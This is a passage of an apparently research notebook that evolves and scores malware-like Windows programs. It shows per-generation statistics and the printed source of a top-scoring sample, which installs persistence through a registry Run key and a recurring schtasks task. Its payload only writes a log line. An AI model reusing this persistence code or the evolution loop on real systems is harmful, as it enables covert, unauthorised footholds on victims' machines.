#   Change: Δμ=+0.2096 (+92.74%)
#   Test: Mann-Whitney U, p=0.0000 ***
#   Effect Size: Cohen's d=1.3279 (large)
#   Significant: YES
#
# ====================================================================================================
# GENERATION 10
# ====================================================================================================
#
# Repair Operation:
#   Before: μ=0.2701, σ=0.1740, n=64
#   After:  μ=0.2701, σ=0.1740, n=64
#   Change: Δμ=+0.0000 (+0.00%)
#   Test: Mann-Whitney U, p=1.0000 ns
#   Effect Size: Cohen's d=0.0000 (negligible)
#   Significant: NO
#
# Mutation Operation:
#   Before: μ=0.2701, σ=0.1740, n=64
#   After:  μ=0.1250, σ=0.1479, n=64
#   Change: Δμ=-0.1452 (-53.74%)
#   Test: Mann-Whitney U, p=0.0000 ***
#   Effect Size: Cohen's d=-0.8920 (large)
#   Significant: YES
#
# Repair Mutants Operation:
#   Before: μ=0.1250, σ=0.1479, n=64
#   After:  μ=0.1944, σ=0.1671, n=64
#   Change: Δμ=+0.0694 (+55.54%)
#   Test: Mann-Whitney U, p=0.0033 **
#   Effect Size: Cohen's d=0.4365 (small)
#   Significant: YES
#
# Selection Operation:
#   Before: μ=0.1944, σ=0.1671, n=64
#   After:  μ=0.4522, σ=0.0788, n=31
#   Change: Δμ=+0.2578 (+132.64%)
#   Test: Mann-Whitney U, p=0.0000 ***
#   Effect Size: Cohen's d=1.7674 (large)
#   Significant: YES
#
# ====================================================================================================
# GENERATION 11
# ====================================================================================================
#
# Repair Operation:
#   Before: μ=0.2637, σ=0.2040, n=62
#   After:  μ=0.2672, σ=0.2006, n=62
#   Change: Δμ=+0.0036 (+1.35%)
#   Test: Mann-Whitney U, p=0.7996 ns
#   Effect Size: Cohen's d=0.0174 (negligible)
#   Significant: NO
#
# Mutation Operation:
#   Before: μ=0.2672, σ=0.2006, n=62
#   After:  μ=0.1002, σ=0.1506, n=62
#   Change: Δμ=-0.1671 (-62.52%)
#   Test: Mann-Whitney U, p=0.0000 ***
#   Effect Size: Cohen's d=-0.9345 (large)
#   Significant: YES
#
# Repair Mutants Operation:
#   Before: μ=0.1002, σ=0.1506, n=62
#   After:  μ=0.1842, σ=0.1766, n=62
#   Change: Δμ=+0.0841 (+83.92%)
#   Test: Mann-Whitney U, p=0.0001 ***
#   Effect Size: Cohen's d=0.5080 (medium)
#   Significant: YES
#
# Selection Operation:
#   Before: μ=0.1842, σ=0.1766, n=62
#   After:  μ=0.4747, σ=0.0742, n=31
#   Change: Δμ=+0.2905 (+157.72%)
#   Test: Mann-Whitney U, p=0.0000 ***
#   Effect Size: Cohen's d=1.9104 (large)
#   Significant: YES
#
# ====================================================================================================
# GENERATION 12
# ====================================================================================================
#
# Repair Operation:
#   Before: μ=0.2995, σ=0.2081, n=59
#   After:  μ=0.3106, σ=0.2075, n=59
#   Change: Δμ=+0.0111 (+3.72%)
#   Test: Mann-Whitney U, p=0.7117 ns
#   Effect Size: Cohen's d=0.0531 (negligible)
#   Significant: NO
#
# Mutation Operation:
#   Before: μ=0.3106, σ=0.2075, n=59
#   After:  μ=0.1349, σ=0.1925, n=59
#   Change: Δμ=-0.1758 (-56.58%)
#   Test: Mann-Whitney U, p=0.0000 ***
#   Effect Size: Cohen's d=-0.8706 (large)
#   Significant: YES
#
# Repair Mutants Operation:
#   Before: μ=0.1349, σ=0.1925, n=59
#   After:  μ=0.2287, σ=0.2246, n=59
#   Change: Δμ=+0.0938 (+69.54%)
#   Test: Mann-Whitney U, p=0.0004 ***
#   Effect Size: Cohen's d=0.4446 (small)
#   Significant: YES
#
# Selection Operation:
#   Before: μ=0.2287, σ=0.2246, n=59
#   After:  μ=0.5286, σ=0.0610, n=31
#   Change: Δμ=+0.2999 (+131.14%)
#   Test: Mann-Whitney U, p=0.0000 ***
#   Effect Size: Cohen's d=1.5996 (large)
#   Significant: YES
#
# ====================================================================================================
# GENERATION 13
# ====================================================================================================
#
# Repair Operation:
#   Before: μ=0.3062, σ=0.2331, n=64
#   After:  μ=0.3042, σ=0.2353, n=64
#   Change: Δμ=-0.0019 (-0.63%)
#   Test: Mann-Whitney U, p=0.8961 ns
#   Effect Size: Cohen's d=-0.0082 (negligible)
#   Significant: NO
#
# Mutation Operation:
#   Before: μ=0.3042, σ=0.2353, n=64
#   After:  μ=0.1256, σ=0.1805, n=64
#   Change: Δμ=-0.1786 (-58.71%)
#   Test: Mann-Whitney U, p=0.0000 ***
#   Effect Size: Cohen's d=-0.8451 (large)
#   Significant: YES
#
# Repair Mutants Operation:
#   Before: μ=0.1256, σ=0.1805, n=64
#   After:  μ=0.2401, σ=0.2317, n=64
#   Change: Δμ=+0.1145 (+91.12%)
#   Test: Mann-Whitney U, p=0.0001 ***
#   Effect Size: Cohen's d=0.5468 (medium)
#   Significant: YES
#
# Selection Operation:
#   Before: μ=0.2401, σ=0.2317, n=64
#   After:  μ=0.5698, σ=0.0429, n=31
#   Change: Δμ=+0.3298 (+137.35%)
#   Test: Mann-Whitney U, p=0.0000 ***
#   Effect Size: Cohen's d=1.7018 (large)
#   Significant: YES
#
# ====================================================================================================
# GENERATION 14
# ====================================================================================================
#
# Repair Operation:
#   Before: μ=0.3315, σ=0.2393, n=64
#   After:  μ=0.3296, σ=0.2414, n=64
#   Change: Δμ=-0.0018 (-0.55%)
#   Test: Mann-Whitney U, p=0.9267 ns
#   Effect Size: Cohen's d=-0.0075 (negligible)
#   Significant: NO
#
# Mutation Operation:
#   Before: μ=0.3296, σ=0.2414, n=64
#   After:  μ=0.1518, σ=0.2030, n=64
#   Change: Δμ=-0.1778 (-53.94%)
#   Test: Mann-Whitney U, p=0.0000 ***
#   Effect Size: Cohen's d=-0.7911 (medium)
#   Significant: YES
#
# Repair Mutants Operation:
#   Before: μ=0.1518, σ=0.2030, n=64
#   After:  μ=0.2378, σ=0.2370, n=64
#   Change: Δμ=+0.0860 (+56.63%)
#   Test: Mann-Whitney U, p=0.0017 **
#   Effect Size: Cohen's d=0.3866 (small)
#   Significant: YES
#
# Selection Operation:
#   Before: μ=0.2378, σ=0.2370, n=64
#   After:  μ=0.5924, σ=0.0226, n=31
#   Change: Δμ=+0.3546 (+149.13%)
#   Test: Mann-Whitney U, p=0.0000 ***
#   Effect Size: Cohen's d=1.7997 (large)
#   Significant: YES
#
# ====================================================================================================
# GENERATION 15
# ====================================================================================================
#
# Repair Operation:
#   Before: μ=0.0766, σ=0.0457, n=29
#   After:  μ=0.0985, σ=0.0795, n=29
#   Change: Δμ=+0.0219 (+28.53%)
#   Test: Mann-Whitney U, p=0.4037 ns
#   Effect Size: Cohen's d=0.3313 (small)
#   Significant: NO
#
# Mutation Operation:
#   Before: μ=0.0985, σ=0.0795, n=29
#   After:  μ=0.0877, σ=0.0733, n=29
#   Change: Δμ=-0.0108 (-10.95%)
#   Test: Mann-Whitney U, p=0.3829 ns
#   Effect Size: Cohen's d=-0.1385 (negligible)
#   Significant: NO
#
# Repair Mutants Operation:
#   Before: μ=0.0877, σ=0.0733, n=29
#   After:  μ=0.1074, σ=0.0839, n=29
#   Change: Δμ=+0.0198 (+22.55%)
#   Test: Mann-Whitney U, p=0.2358 ns
#   Effect Size: Cohen's d=0.2467 (small)
#   Significant: NO
#
# Selection Operation:
#   Before: μ=0.1074, σ=0.0839, n=29
#   After:  μ=0.1334, σ=0.0701, n=31
#   Change: Δμ=+0.0260 (+24.19%)
#   Test: Mann-Whitney U, p=0.0589 ns
#   Effect Size: Cohen's d=0.3316 (small)
#   Significant: NO
#
# ====================================================================================================
# GENERATION 16
# ====================================================================================================
#
# Repair Operation:
#   Before: μ=0.1076, σ=0.0647, n=60
#   After:  μ=0.1093, σ=0.0635, n=60
#   Change: Δμ=+0.0017 (+1.57%)
#   Test: Mann-Whitney U, p=0.7043 ns
#   Effect Size: Cohen's d=0.0261 (negligible)
#   Significant: NO
#
# Mutation Operation:
#   Before: μ=0.1093, σ=0.0635, n=60
#   After:  μ=0.0961, σ=0.0530, n=60
#   Change: Δμ=-0.0133 (-12.14%)
#   Test: Mann-Whitney U, p=0.1691 ns
#   Effect Size: Cohen's d=-0.2251 (small)
#   Significant: NO
#
# Repair Mutants Operation:
#   Before: μ=0.0961, σ=0.0530, n=60
#   After:  μ=0.1031, σ=0.0535, n=60
#   Change: Δμ=+0.0070 (+7.29%)
#   Test: Mann-Whitney U, p=0.4027 ns
#   Effect Size: Cohen's d=0.1305 (negligible)
#   Significant: NO
#
# Selection Operation:
#   Before: μ=0.1031, σ=0.0535, n=60
#   After:  μ=0.1336, σ=0.0701, n=31
#   Change: Δμ=+0.0306 (+29.68%)
#   Test: Mann-Whitney U, p=0.0090 **
#   Effect Size: Cohen's d=0.5071 (medium)
#   Significant: YES
#
# ====================================================================================================
# GENERATION 17
# ====================================================================================================
#
# Repair Operation:
#   Before: μ=0.1309, σ=0.0936, n=54
#   After:  μ=0.1316, σ=0.0930, n=54
#   Change: Δμ=+0.0007 (+0.56%)
#   Test: Mann-Whitney U, p=0.8127 ns
#   Effect Size: Cohen's d=0.0078 (negligible)
#   Significant: NO
#
# Mutation Operation:
#   Before: μ=0.1316, σ=0.0930, n=54
#   After:  μ=0.1287, σ=0.0952, n=54
#   Change: Δμ=-0.0029 (-2.21%)
#   Test: Mann-Whitney U, p=0.6552 ns
#   Effect Size: Cohen's d=-0.0306 (negligible)
#   Significant: NO
#
# Repair Mutants Operation:
#   Before: μ=0.1287, σ=0.0952, n=54
#   After:  μ=0.1371, σ=0.0942, n=54
#   Change: Δμ=+0.0084 (+6.54%)
#   Test: Mann-Whitney U, p=0.4125 ns
#   Effect Size: Cohen's d=0.0880 (negligible)
#   Significant: NO
#
# Selection Operation:
#   Before: μ=0.1371, σ=0.0942, n=54
#   After:  μ=0.1945, σ=0.1294, n=31
#   Change: Δμ=+0.0574 (+41.90%)
#   Test: Mann-Whitney U, p=0.0058 **
#   Effect Size: Cohen's d=0.5238 (medium)
#   Significant: YES
#
# ====================================================================================================
# GENERATION 18
# ====================================================================================================
#
# Repair Operation:
#   Before: μ=0.1543, σ=0.1226, n=48
#   After:  μ=0.1580, σ=0.1206, n=48
#   Change: Δμ=+0.0037 (+2.43%)
#   Test: Mann-Whitney U, p=0.7736 ns
#   Effect Size: Cohen's d=0.0304 (negligible)
#   Significant: NO
#
# Mutation Operation:
#   Before: μ=0.1580, σ=0.1206, n=48
#   After:  μ=0.1102, σ=0.1099, n=48
#   Change: Δμ=-0.0478 (-30.26%)
#   Test: Mann-Whitney U, p=0.0055 **
#   Effect Size: Cohen's d=-0.4102 (small)
#   Significant: YES
#
# Repair Mutants Operation:
#   Before: μ=0.1102, σ=0.1099, n=48
#   After:  μ=0.1450, σ=0.1350, n=48
#   Change: Δμ=+0.0348 (+31.57%)
#   Test: Mann-Whitney U, p=0.0785 ns
#   Effect Size: Cohen's d=0.2796 (small)
#   Significant: NO
#
# Selection Operation:
#   Before: μ=0.1450, σ=0.1350, n=48
#   After:  μ=0.2344, σ=0.1465, n=31
#   Change: Δμ=+0.0895 (+61.72%)
#   Test: Mann-Whitney U, p=0.0003 ***
#   Effect Size: Cohen's d=0.6326 (medium)
#   Significant: YES
#
# ====================================================================================================
# GENERATION 19
# ====================================================================================================
#
# Repair Operation:
#   Before: μ=0.1612, σ=0.1331, n=60
#   After:  μ=0.1612, σ=0.1331, n=60
#   Change: Δμ=-0.0000 (-0.01%)
#   Test: Mann-Whitney U, p=0.9682 ns
#   Effect Size: Cohen's d=-0.0001 (negligible)
#   Significant: NO
#
# Mutation Operation:
#   Before: μ=0.1612, σ=0.1331, n=60
#   After:  μ=0.1264, σ=0.1039, n=60
#   Change: Δμ=-0.0348 (-21.61%)
#   Test: Mann-Whitney U, p=0.1232 ns
#   Effect Size: Cohen's d=-0.2894 (small)
#   Significant: NO
#
# Repair Mutants Operation:
#   Before: μ=0.1264, σ=0.1039, n=60
#   After:  μ=0.1680, σ=0.1428, n=60
#   Change: Δμ=+0.0416 (+32.91%)
#   Test: Mann-Whitney U, p=0.0961 ns
#   Effect Size: Cohen's d=0.3303 (small)
#   Significant: NO
#
# Selection Operation:
#   Before: μ=0.1680, σ=0.1428, n=60
#   After:  μ=0.3111, σ=0.1605, n=31
#   Change: Δμ=+0.1432 (+85.24%)
#   Test: Mann-Whitney U, p=0.0000 ***
#   Effect Size: Cohen's d=0.9499 (large)
#   Significant: YES
#
# ====================================================================================================
# GENERATION 20
# ====================================================================================================
#
# Repair Operation:
#   Before: μ=0.1930, σ=0.1632, n=64
#   After:  μ=0.1935, σ=0.1626, n=64
#   Change: Δμ=+0.0005 (+0.26%)
#   Test: Mann-Whitney U, p=0.9210 ns
#   Effect Size: Cohen's d=0.0031 (negligible)
#   Significant: NO
#
# Mutation Operation:
#   Before: μ=0.1935, σ=0.1626, n=64
#   After:  μ=0.1617, σ=0.1604, n=64
#   Change: Δμ=-0.0318 (-16.44%)
#   Test: Mann-Whitney U, p=0.1078 ns
#   Effect Size: Cohen's d=-0.1954 (negligible)
#   Significant: NO
#
# Repair Mutants Operation:
#   Before: μ=0.1617, σ=0.1604, n=64
#   After:  μ=0.1921, σ=0.1655, n=64
#   Change: Δμ=+0.0305 (+18.84%)
#   Test: Mann-Whitney U, p=0.1451 ns
#   Effect Size: Cohen's d=0.1854 (negligible)
#   Significant: NO
#
# Selection Operation:
#   Before: μ=0.1921, σ=0.1655, n=64
#   After:  μ=0.3778, σ=0.1440, n=31
#   Change: Δμ=+0.1857 (+96.66%)
#   Test: Mann-Whitney U, p=0.0000 ***
#   Effect Size: Cohen's d=1.1571 (large)
#   Significant: YES
#
#
# ====================================================================================================
# AGGREGATE ANALYSIS ACROSS ALL GENERATIONS
# ====================================================================================================
#
# Repair Operation:
#   Average Mean Change: +0.0031 (±0.0058)
#   Average % Change: +2.43% (±6.39%)
#   Average Effect Size: 0.0315 (±0.0749)
#   Significant in 0/20 generations
#   Consistency: 0.0% of generations show significant effect
#   Meta-analysis: Effect size significantly different from 0? p=0.0752 NO
#
# Mutation Operation:
#   Average Mean Change: -0.0791 (±0.0653)
#   Average % Change: -34.39% (±19.58%)
#   Average Effect Size: -0.5368 (±0.3304)
#   Significant in 13/20 generations
#   Consistency: 65.0% of generations show significant effect
#   Meta-analysis: Effect size significantly different from 0? p=0.0000 YES
#
# Repair Mutants Operation:
#   Average Mean Change: +0.0488 (±0.0335)
#   Average % Change: +41.87% (±27.10%)
#   Average Effect Size: 0.3437 (±0.1571)
#   Significant in 11/20 generations
#   Consistency: 55.0% of generations show significant effect
#   Meta-analysis: Effect size significantly different from 0? p=0.0000 YES
#
# Selection Operation:
#   Average Mean Change: +0.1634 (±0.1032)
#   Average % Change: +91.34% (±40.91%)
#   Average Effect Size: 1.2037 (±0.5009)
#   Significant in 19/20 generations
#   Consistency: 95.0% of generations show significant effect
#   Meta-analysis: Effect size significantly different from 0? p=0.0000 YES
# ====================================================================================================
# SUMMARY TABLE
# ====================================================================================================
#                          mean_diff                         effect_size  \
#                               mean     std     min     max        mean
# phase
# Mutation Operation         -0.0791  0.0653 -0.1786 -0.0029     -0.5368
# Repair Mutants Operation    0.0488  0.0335  0.0070  0.1145      0.3437
# Repair Operation            0.0031  0.0058 -0.0019  0.0219      0.0315
# Selection Operation         0.1634  0.1032  0.0260  0.3546      1.2037
#
#                                                  significant
#                              std     min     max         sum  mean
# phase
# Mutation Operation        0.3304 -1.0228 -0.0306          13  0.65
# Repair Mutants Operation  0.1571  0.0880  0.6104          11  0.55
# Repair Operation          0.0749 -0.0121  0.3313           0  0.00
# Selection Operation       0.5009  0.3316  1.9104          19  0.95

# %% [markdown]
# ### Print the champion's code

# %%
gen_idx = 13
def get_generation_champion(gen_idx: int):
    import base64
    champ_pop = checkpoint[gen_idx]["selected_population"]
    champ_fitness = [g.get_candidate().get_fitness() for g in champ_pop]
    champ_idx = np.argmax(champ_fitness)
    champ_individual = champ_pop[champ_idx]

    champ = {
        "genome": champ_individual,
        "fitness": champ_individual.get_candidate().get_fitness(),
        "code": base64.b64decode(champ_individual.get_candidate().code).decode("utf-8"),
        "makefile": base64.b64decode(champ_individual.get_candidate().makefile).decode("utf-8")
    }

    return champ

# get highest fitness individual
champ = get_generation_champion(gen_idx)
print(f"{champ['genome'].get_candidate()}")

# print the code of the champion
print(f"Code of the champion for index {gen_idx}:")
print()
print(champ['code'])
print()
print(f"Makefile of the champion for index {gen_idx}:")
print()
print(champ['makefile'])
# Out:
# Candidate ID: 9772a0cb1ba308b45d8d42ba890b2af0586d126030a4afb25c441c1eb9f5f5c4, Classification: cmd, Status: 3, Fitness: 6.454e-01, F1: 1.000e+00, F2: 6.667e-01, F3: 6.387e-01, Analysis ID: 29918, Error: N/A
# Code of the champion for index 13:
#
# #include <windows.h>
# #include <iostream>
# #include <string>
# #include <chrono>
# #include <thread>
# #include <direct.h>
# #include <ctime>
#
# // Remove #pragma comment(lib, "shell32.lib") as it's not supported by MinGW/GCC
#
# // Function prototypes
# BOOL RunCommand(LPCSTR cmd);
# BOOL CreateRegistryRunKey();
# VOID WriteToLogFile(LPCSTR lpszMessage);
# VOID SetupRecurringExecution();
#
# // Registry path for persistence
# static const char* REGISTRY_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
# static const char* VALUE_NAME = "GIMC_BootMonitor";
# static std::string EXE_PATH;
#
# // Write to test file
# VOID WriteToLogFile(LPCSTR lpszMessage) {
#     HANDLE hFile = CreateFileA("C:\\Users\\Public\\gimc_test.log",
#                                 GENERIC_WRITE,
#                                 FILE_SHARE_READ | FILE_SHARE_WRITE,
#                                 NULL,
#                                 OPEN_ALWAYS,
#                                 FILE_ATTRIBUTE_NORMAL,
#                                 NULL);
#     if (hFile == INVALID_HANDLE_VALUE) return;
#
#     DWORD dwBytesWritten;
#     SetFilePointer(hFile, 0, NULL, FILE_END);
#
#     std::string timestamp = "[";
#     time_t now = time(nullptr);
#     timestamp += ctime(&now);
#     timestamp.pop_back();
#     timestamp += "] ";
#
#     std::string message = timestamp + lpszMessage + "\r\n";
#     WriteFile(hFile, message.c_str(), (DWORD)message.length(), &dwBytesWritten, NULL);
#     CloseHandle(hFile);
# }
#
# // Run command using CreateProcess
# BOOL RunCommand(LPCSTR cmd) {
#     STARTUPINFOA si;
#     PROCESS_INFORMATION pi;
#
#     ZeroMemory(&si, sizeof(si));
#     si.cb = sizeof(si);
#     ZeroMemory(&pi, sizeof(pi));
#
#     BOOL result = CreateProcessA(NULL,
#                                  (LPSTR)cmd,
#                                  NULL,
#                                  NULL,
#                                  FALSE,
#                                  0,
#                                  NULL,
#                                  NULL,
#                                  &si,
#                                  &pi);
#
#     if (result) {
#         CloseHandle(pi.hThread);
#         CloseHandle(pi.hProcess);
#     }
#     return result;
# }
#
# // Setup recurring execution via scheduled task using schtasks.exe
# VOID SetupRecurringExecution() {
#     // First write initial log
#     WriteToLogFile("BSI: Setting up recurring execution via schtasks.exe");
#
#     // Create a scheduled task that runs every 5 seconds
#     std::string taskName = "GIMC_BootMonitor_Task";
#     std::string taskCmd = "\"cmd.exe\" /c \"echo [\" >> C:\\Users\\Public\\gimc_test.log\"";
#
#     // Create scheduled task
#     std::string createTaskCmd = "schtasks /create /tn \"" + taskName +
#                                 "\" /tr \"" + taskCmd +
#                                 "\" /sc minute /mo 1 /f";
#     RunCommand(createTaskCmd.c_str());
#
#     // Immediately start the task
#     std::string runTaskCmd = "schtasks /run /tn \"" + taskName + "\"";
#     RunCommand(runTaskCmd.c_str());
# }
#
# // Set up registry Run key for immediate next boot execution
# BOOL CreateRegistryRunKey() {
#     HKEY hKey;
#     LONG lResult = RegOpenKeyExA(HKEY_CURRENT_USER,
#                                  REGISTRY_KEY,
#                                  0,
#                                  KEY_SET_VALUE,
#                                  &hKey);
#     if (lResult != ERROR_SUCCESS) {
#         WriteToLogFile("BSI: Failed to open registry key");
#         return FALSE;
#     }
#
#     // Get current executable path
#     char buffer[MAX_PATH];
#     GetModuleFileNameA(NULL, buffer, MAX_PATH);
#     EXE_PATH = std::string(buffer);
#
#     // Create payload script that will run at next logon
#     std::string payloadScript = "cmd.exe /c \"echo [\" >> C:\\Users\\Public\\gimc_test.log\"";
#
#     // For this implementation, create a scheduled task via schtasks and mark as recurring
#     SetupRecurringExecution();
#
#     RegSetValueExA(hKey, VALUE_NAME, 0, REG_SZ,
#                    (BYTE*)EXE_PATH.c_str(),
#                    (DWORD)EXE_PATH.length() + 1);
#
#     RegCloseKey(hKey);
#     return TRUE;
# }
#
# // Entry point
# int main() {
#     // Ensure log file is created
#     WriteToLogFile("BSI: Starting recurring execution setup");
#
#     // Create registry entry to maintain persistence
#     if (!CreateRegistryRunKey()) {
#         WriteToLogFile("BSI: Failed to setup persistence");
#         return 1;
#     }
#
#     WriteToLogFile("BSI: Recurring execution configured successfully");
#
#     // Exit immediately after setting up
#     return 0;
# }
#
# Makefile of the champion for index 13:
#
# CC = g++
# CFLAGS = -static -Wall -O2
# LDFLAGS = -lshell32 -ladvapi32
#
# TARGET = scheduled_bsi.exe
# SRC = main.cpp
#
# all: $(TARGET)
#
# $(TARGET): $(SRC)
# 	$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)
#
# clean:
# 	rm -f $(TARGET)
